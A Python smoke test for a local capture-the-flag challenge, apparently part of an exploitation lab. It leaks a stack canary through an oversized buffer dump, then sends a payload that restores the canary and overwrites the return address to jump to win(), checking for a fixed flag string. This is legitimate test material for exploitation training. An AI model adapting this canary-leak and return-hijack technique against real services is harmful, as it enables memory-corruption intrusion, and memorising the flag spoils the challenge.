#!/usr/bin/env python3
"""Smoke test for ret2func-002 (port 9985): canary leak, then win().

The service loops: each round copies the input into small[8] with
memcpy (the read channel crosses NULs whole) and then dumps 40 raw
bytes from the buffer with write(1, ...). Those 40 bytes cover:

  dump[0:8]    small[8]        (rbp_v - 0x10 .. rbp_v - 0x8)
  dump[8:16]   canary          (rbp_v - 0x8 .. rbp_v)
  dump[16:24]  saved rbp       (rbp_v .. rbp_v + 0x8)
  dump[24:32]  return slot     (rbp_v + 0x8 .. rbp_v + 0x10)
  dump[32:40]  beyond the slot (caller frame noise)

Round 1 (leak): the 40-byte dump hands over the canary verbatim - the
glibc canary's first byte is NUL, but the raw write channel crosses
it whole. Round 2 (strike): the payload restores the canary byte for
byte, replaces the saved rbp with a dummy, and aims the return slot at
win(). The canary check passes (the value matches), leave/ret lands on
win(), and win() prints the flag. win() realigns rsp itself (the
and $-16 prologue), so the smashed frame's alignment is not an issue.

win() address: 0x4011e6 (no-PIE: the banner announces it).
main() NULs the last byte of the input before the copy - the win()
address's top byte is 0x00 already, so the zeroing is harmless.

Success output:

    FLAG: FLAG{mr5_canary_leak_then_win}
"""

import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = 9985

WIN = 0x4011E6  # win(): the banner announces it (no-PIE, fixed)
DUMP_LEN = 40  # write(1, small, 40): the leak's exact length

p64 = lambda x: struct.pack("<Q", x)


def recv_until(s, marker, timeout=10):
    import time

    data = b""
    s.settimeout(timeout)
    while marker not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def recv_exact(s, n, timeout=10):
    data = b""
    s.settimeout(timeout)
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # 1. the banner confirms the service (win() at 0x4011e6)
    banner = recv_until(s, b"name? ")
    print(f"[+] banner: {banner.split(b'name? ')[0].decode(errors='replace').strip()}")
    assert b"ret2func-002 target" in banner, "wrong service"

    # 2. leak round: 8 bytes fill the buffer, the 40-byte dump rides out
    #    with the canary verbatim (raw write crosses the NUL byte)
    s.send(b"A" * 8)
    dump = recv_exact(s, DUMP_LEN)
    canary = dump[8:16]
    print(f"[+] canary: {canary.hex()} (first byte NUL: {canary[0] == 0})")
    assert canary[0] == 0, "canary's first byte is not NUL"

    # drain the leak round's tail: vuln_copy returned normally, so main
    # echoed 'hello' and looped back to the prompt. It must be off the
    # wire before the strike round's reads - otherwise the 'hello' echo
    # would masquerade as a failed hijack in the strike round's output.
    recv_until(s, b"name? ")

    # 3. strike round: restore the canary, dummy rbp, aim the return
    #    slot at win(). main NULs the payload's last byte - win's top
    #    byte is 0x00 already, so the zeroing is harmless.
    payload = b"A" * 8 + canary + p64(0xDEADBEEF) + p64(WIN)
    assert len(payload) == 32
    s.send(payload)
    out = recv_until(s, b"FLAG: ", timeout=10)
    out += s.recv(4096)  # the flag line + whatever follows
    print(f"[+] output tail: {out[-80:]!r}")

    # 4. the oracle: win() printed the flag (the 'hello' echo never ran)
    assert b"FLAG{mr5_canary_leak_then_win}" in out, "oracle flag missing"
    assert b"hello" not in out, "return landed back in main: canary or offset wrong"
    print("[+] ret2func-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
